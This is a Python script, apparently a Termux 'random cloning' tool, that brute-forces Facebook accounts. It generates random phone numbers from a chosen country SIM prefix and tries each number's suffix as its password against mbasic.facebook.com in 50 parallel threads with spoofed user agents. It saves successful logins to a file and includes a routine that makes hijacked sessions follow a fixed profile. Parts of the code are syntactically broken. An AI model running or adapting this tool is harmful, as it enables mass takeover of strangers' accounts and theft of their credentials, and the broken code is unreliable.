#--------------------INFO-------------------#
#CODING BY 
#SCRIPT RANDOM CLONE 
#FACEBOOK > AHSAM UL HAQ
#GITHUB > -AHSAM-JOIYA404
#------------->MENU-------------#
import os
import sys
import time
import requests
import uuid
os.system('clear')
def o():
    os.system('clear')
    print(logo)
    ip = requests.get("https://api.ipify.org").text
    jalan("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mYour IP Addres \033[38;5;196m: \033[1;32m"+ip)
    jalan('\033[1;97m====================================================') 
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[95;1mSTART RANDOM CLONING   ")
    # print("\033[97;1m[\033[92;1m2\033[97;1m] \033[95;1mCONTACT ADMIN")
    # print("\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mJOIN MY GROUP ")
    AHSAM = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect Option \033[38;5;196m: ')
    if AHSAM == '1':
        i()
    if AHSAM == '2':
        os.system('xdg-open https://www.facebook.com/AHSAM.FATHER.OF.HETARS')
    if AHSAM == '3':
        os.system('xdg-open https://chat.whatsapp.com/KSyhJTtOwdpByrU36dwBuX')
    if AHSAM == 'E':
        os.system('exit')
        return None
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)

def back():
	login()
AHSAM="AHSAM"
imt="SETU"
ak="CLASS3-"
myid=uuid.uuid4().hex[:8].upper()
try:
	key1 = open('/storage/emulated/0/android8.txt', 'r').read()
except:
	kok=open('/storage/emulated/0/android8.txt', 'w')
	kok.write(myid+imt)
	kok.close()
            
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bi = random.choice([M,N,K,B,U])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
NameX =input('\033[1;97m  [•]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[0;93m')
logo=("""
 \033[1;37m  ╔═══════════════════════════════════════════╗                                    
             \033[1;37m _______                   
             \033[1;37m(  ___  )|\     /||\     /|
             \033[1;37m| (   ) || )   ( || )   ( |
             \033[1;37m| (___) || |   | || (___) |
             \033[1;37m|  ___  || |   | ||  ___  |
             \033[1;37m| (   ) || |   | || (   ) |
             \033[1;37m| )   ( || (___) || )   ( |
             \033[1;37m|/     \|(_______)|/     \|\033[1;35mJOIYA\033[1;37m
\033[1;37m  ╚═══════════════════════════════════════════╝
\x1b[1;92m┏─────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mAHSAM AND TUTUL
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mAHSAM UL HAQ               
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+923411471937              
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mFILE CLONING 
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TYPE       \x1b[1;97m: \x1b[1;92mFREE    
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mMR-AUH404         
\x1b[1;92m┗─────────────────────────────────────────┛    """                                 

try:
    jalan("\033[38;5;46m\n  \033[95;1m[ WiFi+Data\033[92;1m Working Okay Bro ]\n")
    time.sleep(5)
    AHSAM()
    print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    AHSAM()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')


loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]

for xd in range(98605):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;97m====================================================') 
    print('\033[97;1m[\033[92;1m•\033[97;1m]\033[1;97mPK CODE    \033[38;5;196m  :\033[0;93m 92301 92302 92303 92305')
    print('\033[97;1m[\033[92;1m•\033[97;1m]\033[1;97mBD CODE    \033[38;5;196m  :\033[0;92m 016 017 018 019 014 013')
    print(f'\033[97;1m[\033[92;1m•\033[97;1m]\033[1;97mIND SIM CODE \033[1;91m: \x1b[38;5;208m91930 91778 91712 91902')
    print('\033[1;97m====================================================') 
    code = input('\033[0;92mINPUT CODE \033[1;97m: ')
    print("")
    os.system('clear')
    print(logo)
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m2000\033[1;97m , \033[1;34m5000\033[1;97m , \033[1;32m10000")
    limit = int(input("\033[97;1m[\033[92;1m?\033[97;1m] \033[0;92mCLONING ID LIMIT \033[38;5;196m: \033[1;32m"))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        tl = str(len(user))
        print(f"\033[97;1m[\033[92;1m•\033[97;1m]\033[1;92m USER NAME\033[1;91m         :\033[1;32m "+NameX)
        print('\033[97;1m[\033[92;1m•\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m        : \033[0;93m'+code)
        print('\033[97;1m[\033[92;1m•\033[97;1m] \033[92;1mTOTAL IDz  \033[38;5;196m       : \033[0;95m'+tl)
        print('\033[1;97m====================================================') 
        for love in user:
            pwx = [love]
            uid = code+love
            setu.submit(rcrack,uid,pwx,tl)
    print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://mbasic.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="106", "Not)A;Brand";v="24", "Chromium";v="106"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\r\033[1;32m [AHSAM😍-OK] 'uid+' | '+ps+'\033[1;97m')
                open('/sdcard/AHSAM-King-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\r\x1b[38;5;126m [AHSAM-CP] 'uid+' | '+ps+'\033[1;97m')
                # open('/sdcard/AHSAM-XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;93m[\033[1;95mAHSAM\033[0m/%s\33[1;93m]\033[1;97mOK>\033[38;5;46m%s '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass


def Subscraption():
	key1=open('/storage/emulated/0/android8.txt', 'r').read()
	r1=requests.get("https://github.com/AHSAM-JOIYA404/key1/blame/main/aprooval.txt").text
	if key1 in r1:
		os.system('clear')
		o()
	else:
		os.system("clear")
		print(logo)
		print(" \033[97;1m[\033[92;1m•\033[97;1m]\033[0;93mYour Key Copy And Post Group")
		time.sleep(0.0009)
		print(" \033[97;1m[\033[92;1m•\033[97;1m]\33[0;92mYour Key Approval Group Admin AHSAM UL HAQ")
		print(" \033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208mFree Approval No Paid Tools")
		# print(" \033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m15 DAYS 400 TAKA")
		print(" \033[97;1m[\033[92;1m•\033[97;1m]\033[0;94mYour Key  :\033[0;91m "+ak+AHSAM+key1)
		name = input(" \033[97;1m[\033[92;1m•\033[97;1m]\033[0;95mYour Name : ")
		input(" \033[97;1m[\033[92;1m•\033[97;1m]\33[0;92mPress Enter To Post Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+AHSAM+''+key1
		os.system('am start https://facebook.com/groups/554714119911648/?text=' + tks)
		Subscraption() 
#Subscraption()
o()